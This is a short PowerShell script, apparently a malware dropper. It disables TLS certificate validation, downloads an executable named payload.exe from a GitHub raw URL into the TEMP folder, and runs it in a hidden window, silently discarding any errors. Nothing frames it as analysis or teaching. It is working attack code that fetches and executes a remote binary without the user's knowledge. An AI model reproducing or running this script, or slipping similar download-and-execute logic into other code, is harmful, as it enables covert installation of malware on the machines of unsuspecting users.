# SSL/TLS Bypass - Critical for successful web requests
try {
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}

# Function to download and execute payload
function Download-And-Run {
    $payloadUrl = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
    $localPath = Join-Path $env:TEMP "payload.exe"
    
    try {
        # Download using Invoke-WebRequest with basic parsing
        Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing
        
        if (Test-Path $localPath) {
            # Execute silently using Start-Process
            Start-Process -FilePath $localPath -WindowStyle Hidden -NoNewWindow
        }
    }
    catch {
        # Silent error handling
    }
}

# Main execution
Download-And-Run
